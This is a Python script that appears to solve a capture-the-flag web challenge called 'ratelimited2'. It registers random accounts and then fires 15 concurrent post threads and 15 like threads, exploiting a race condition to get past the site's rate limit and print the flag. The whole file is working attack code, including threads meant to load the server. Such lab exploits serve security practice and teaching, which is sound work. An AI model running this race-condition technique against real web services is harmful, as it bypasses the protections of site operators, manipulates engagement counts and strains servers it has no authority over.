import requests
import threading
import random
import string
import time
import re

base_url = 'http://ratelimited2.ctf.offdef.it/'

def login(session, username, password):
    url = base_url + '/login'
    data = {'username': username, 'password': password, 'login': 'login'}
    response = session.post(url, data=data)
    return response.text

def register(session, username, password):
    url = base_url + '/login'
    data = {'username': username, 'password': password, 'register': 'register'}
    response = session.post(url, data=data)
    return response.text

def post(session, username, password, content):
    # Post a post and get the id of the post (the number of posts at the time of the post)
    url = base_url + '/post'

    data = {'login': 'login', 'img': 'aaa', 'content': content}

    session.post(url, data=data)

    # Get the page from base_url
    response = session.get(base_url)

    # Count the number of 'by' in the page
    post_id = response.text.count('by')

    return post_id

def like(session, post_id):
    url = base_url + '/like'

    data = {'like':'like', 'message_id': post_id}

    session.post(url, data=data)

def flag(session):
    response = session.get(base_url)
    if('flag' in response.text):
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')

def random_user():
    # return username and password randomly generated
    username = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
    password = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
    return username, password

while True:
    s = requests.Session() # Create a session object

    # Generate a random username and password
    u, p = random_user()

    # Register the user
    register(s, u, p)

    # Login with the user
    login(s, u, p)

    # Post a post and get the id of the post (the number of posts at the time of the post)
    post_id = post(s, u, p, 'thisworkedbefore')

    print('Post id: ' + str(post_id))

    threads = []
    for i in range(15): # used to heavy the server
        threads.append(threading.Thread(target=post, args=(s, u, p, 'fuffa')))
    for i in range(15): # add threads to like
        threads.append(threading.Thread(target=like, args=(s, post_id)))

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print(u)
    print(p)

    flag(s) # it trully works :D

    time.sleep(0.1)